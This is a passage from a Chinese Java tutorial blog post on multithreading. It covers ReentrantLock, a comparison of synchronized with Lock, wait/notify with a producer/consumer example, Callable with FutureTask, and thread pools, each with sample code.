java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Window</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="comment">//1.实例化ReentrantLock</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();<span class="comment">//如果是继承Thread则需设置成static</span></span><br><span class="line">    <span class="comment">//参数为true，先到先抢占</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="comment">//2.调用锁定方法lock()</span></span><br><span class="line">                lock.lock();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;：售票，票号为：&quot;</span> + ticket);</span><br><span class="line">                    ticket--;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">//3.调用解锁方法：unlock()</span></span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LockTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Window</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Window</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(w);</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;窗口1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;窗口2&quot;</span>);</span><br><span class="line">        t3.setName(<span class="string">&quot;窗口3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="synchronized-与-Lock-的对比"><a href="#synchronized-与-Lock-的对比" class="headerlink" title="synchronized 与 Lock 的对比"></a>synchronized 与 Lock 的对比</h2><ol><li><p>Lock是显式锁（手动开启和关闭锁，别忘记关闭锁），synchronized是隐式锁，出了作用域自动释放</p></li><li><p>Lock只有代码块锁，synchronized有代码块锁和方法锁</p></li><li><p>使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性（提供更多的子类）。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">优先使用顺序：</span><br><span class="line">Lock -&gt; 同步代码块（已经进入了方法体，分配了相应资源） -&gt; 同步方法（在方法体之外）</span><br></pre></td></tr></table></figure><h1 id="线程的通信"><a href="#线程的通信" class="headerlink" title="线程的通信"></a>线程的通信</h1><h2 id="wait-，notify-，notifyAll"><a href="#wait-，notify-，notifyAll" class="headerlink" title="wait()，notify()，notifyAll()"></a>wait()，notify()，notifyAll()</h2><p>使用两个线程打印 1-100。线程1, 线程2交替打印</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Number</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (obj) &#123;</span><br><span class="line">                obj.notify();</span><br><span class="line">                <span class="keyword">if</span> (number &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + number);</span><br><span class="line">                    number++;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//使得调用如下wait()方法的线程进入阻塞状态</span></span><br><span class="line">                        obj.wait();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommunicationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Number</span>();</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(number);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(number);</span><br><span class="line"></span><br><span class="line">        t1.setName(<span class="string">&quot;线程1&quot;</span>);</span><br><span class="line">        t2.setName(<span class="string">&quot;线程2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>wait():一旦执行此方法，当前线程就进入阻塞状态，并<strong>释放同步监视器</strong>。</li><li>notify():一旦执行此方法，就会唤醒被wait的一个线程。如果有多个线程被wait，就<strong>唤醒优先级高的那个</strong>。</li><li>notifyAll():一旦执行此方法，就会唤醒<strong>所有</strong>被wait的线程。</li><li>wait()，notify()，notifyAll()三个方法<strong>必须使用在同步代码块或同步方法中</strong>。</li><li>wait()，notify()，notifyAll()三个方法的<strong>调用者必须是同步代码块或同步方法中的同步监视器</strong>。否则，会出现IllegalMonitorStateException异常</li><li>wait()，notify()，notifyAll()三个方法是<strong>定义在java.lang.Object类</strong>中。</li></ul><hr><h2 id="面试题：sleep-和-wait-的异同"><a href="#面试题：sleep-和-wait-的异同" class="headerlink" title="面试题：sleep() 和 wait()的异同"></a>面试题：sleep() 和 wait()的异同</h2><ul><li><p>相同点：一旦执行方法，都可以使得当前的线程进入阻塞状态。</p></li><li><p>不同点：</p><ol><li>两个方法声明的位置不同：Thread类中声明sleep() , Object类中声明wait()</li><li>调用的要求不同：sleep()可以在任何需要的场景下调用。 wait()必须使用在同步代码块或同步方法中。</li><li>关于是否释放同步监视器：如果两个方法都使用在同步代码块或同步方法中，sleep()不会释放锁，wait()会释放锁。</li></ol></li></ul><hr><h2 id="经典例题：生产者-消费者问题"><a href="#经典例题：生产者-消费者问题" class="headerlink" title="经典例题：生产者&#x2F;消费者问题"></a>经典例题：生产者&#x2F;消费者问题</h2><p>生产者(Productor)将产品交给店员(Clerk)，而消费者(Customer)从店员处取走产品，店员一次只能持有固定数量的产品(比如:20），如果生产者试图生产更多的产品，店员会叫生产者停一下，如果店中有空位放产品了再通知生产者继续生产；如果店中没有产品了，店员会告诉消费者等一下，如果店中有产品了再通知消费者来取走产品。</p><p>这里可能出现两个问题：</p><ul><li><p>生产者比消费者快时，消费者会漏掉一些数据没有取到。</p></li><li><p>消费者比生产者快时，消费者会取相同的数据。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clerk</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">productCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生产产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">produceProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (productCount &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            productCount++;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:开始生产第&quot;</span> + productCount + <span class="string">&quot;个产品&quot;</span>);</span><br><span class="line">            notify();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//消费产品</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">consumeProduct</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (productCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:开始消费第&quot;</span> + productCount + <span class="string">&quot;个产品&quot;</span>);</span><br><span class="line">            productCount--;</span><br><span class="line">            notify();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;<span class="comment">//生产者</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Clerk clerk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(Clerk clerk)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clerk = clerk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(getName() + <span class="string">&quot;:开始生产产品.....&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">10</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            clerk.produceProduct();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;<span class="comment">//消费者</span></span><br><span class="line">    <span class="keyword">private</span> Clerk clerk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(Clerk clerk)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.clerk = clerk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(getName() + <span class="string">&quot;:开始消费产品.....&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">20</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            clerk.consumeProduct();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Clerk</span> <span class="variable">clerk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Clerk</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Producer</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Producer</span>(clerk);</span><br><span class="line">        p1.setName(<span class="string">&quot;生产者1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Consumer</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Consumer</span>(clerk);</span><br><span class="line">        c1.setName(<span class="string">&quot;消费者1&quot;</span>);</span><br><span class="line">        <span class="type">Consumer</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Consumer</span>(clerk);</span><br><span class="line">        c2.setName(<span class="string">&quot;消费者2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        p1.start();</span><br><span class="line">        c1.start();</span><br><span class="line">        c2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JDK5-0新增线程创建方式"><a href="#JDK5-0新增线程创建方式" class="headerlink" title="JDK5.0新增线程创建方式"></a>JDK5.0新增线程创建方式</h1><h2 id="新增方式一：实现Callable接口"><a href="#新增方式一：实现Callable接口" class="headerlink" title="新增方式一：实现Callable接口"></a>新增方式一：实现Callable接口</h2><p>与使用Runnable接口相比， Callable接口功能更强大些：</p><ul><li><p>相比Runnable的run()方法，Callable的call()方法可以有返回值</p></li><li><p>方法可以抛出异常</p></li><li><p>支持泛型的返回值</p></li><li><p>需要借助FutureTask类，比如获取返回结果</p></li></ul><hr><p>Future接口</p><ul><li><p>可以对具体Runnable、Callable任务的执行结果进行取消、查询是否完成、获取结果等。</p></li><li><p>FutrueTask是Futrue接口的唯一的实现类</p></li><li><p>FutureTask 同时实现了Runnable, Future接口。它既可以作为Runnable被线程执行，又可以作为Future得到Callable的返回值</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.FutureTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumThread</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">            sum = sum + i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadNew</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">NumThread</span> <span class="variable">numThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NumThread</span>();</span><br><span class="line">        FutureTask&lt;Integer&gt; task = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(numThread);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(task).start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> task.get();</span><br><span class="line">            System.out.println(sum);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="新增方式二：使用线程池"><a href="#新增方式二：使用线程池" class="headerlink" title="新增方式二：使用线程池"></a>新增方式二：使用线程池</h2><p><strong>背景：</strong>经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。 </p><p><strong>思路：</strong>提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。</p><p><strong>好处：</strong></p><ul><li><p>提高响应速度（减少了创建新线程的时间）</p></li><li><p>降低资源消耗（重复利用线程池中线程，不需要每次都创建）</p></li><li><p>便于线程管理</p><ul><li>corePoolSize：核心池的大小</li><li>maximumPoolSize：最大线程数 </li><li>keepAliveTime：线程没有任务时最多保持多长时间后会终止</li></ul></li></ul><hr><p>JDK 5.0起提供了线程池相关API：<strong>ExecutorService</strong> 和 <strong>Executors</strong></p><p>ExecutorService：真正的线程池接口。常见子类ThreadPoolExecutor</p><ul><li><p>void execute(Runnable command) ：执行任务&#x2F;命令，没有返回值，一般用来执行Runnable</p></li><li><p>Future<T> submit(Callable<T> task)：执行任务，有返回值，一般又来执行Callable</p></li><li><p>void shutdown() ：关闭连接池</p></li></ul><p>Executors：工具类、线程池的工厂类，用于创建并返回不同类型的线程池</p><ul><li><p>Executors.newCachedThreadPool()：创建一个可根据需要创建新线程的线程池</p></li><li><p>Executors.newFixedThreadPool(n); 创建一个可重用固定线程数的线程池</p></li><li><p>Executors.newSingleThreadExecutor() ：创建一个只有一个线程的线程池</p></li><li><p>Executors.newScheduledThreadPool(n)：创建一个线程池，它可安排在给定延迟后运行命令或者定期地执行。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadPoolExecutor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumberThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;: &quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumberThread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;: &quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 提供指定线程数量的线程池</span></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">service1</span> <span class="operator">=</span> (ThreadPoolExecutor) service;</span><br><span class="line">        <span class="comment">//设置线程池的属性</span></span><br><span class="line"><span class="comment">//        System.out.println(service.getClass());</span></span><br><span class="line"><span class="comment">//        service1.setCorePoolSize(15);</span></span><br><span class="line"><span class="comment">//        service1.setKeepAliveTime();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.执行指定的线程的操作。需要提供实现Runnable接口或Callable接口实现类的对象</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> <span class="title class_">NumberThread</span>());<span class="comment">//适合适用于Runnable</span></span><br><span class="line">        service.execute(<span class="keyword">new</span> <span class="title class_">NumberThread1</span>());<span class="comment">//适合适用于Runnable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        service.submit(Callable callable);//适合使用于Callable</span></span><br><span class="line">        <span class="comment">//3.关闭连接池</span></span><br><span class="line">        service.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 高级编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thread </tag>
            
            <tag> Synchronized </tag>
            
            <tag> Lock </tag>
            
            <tag> Runnable </tag>
            
            <tag> Callable </tag>
            
        </tags>
      
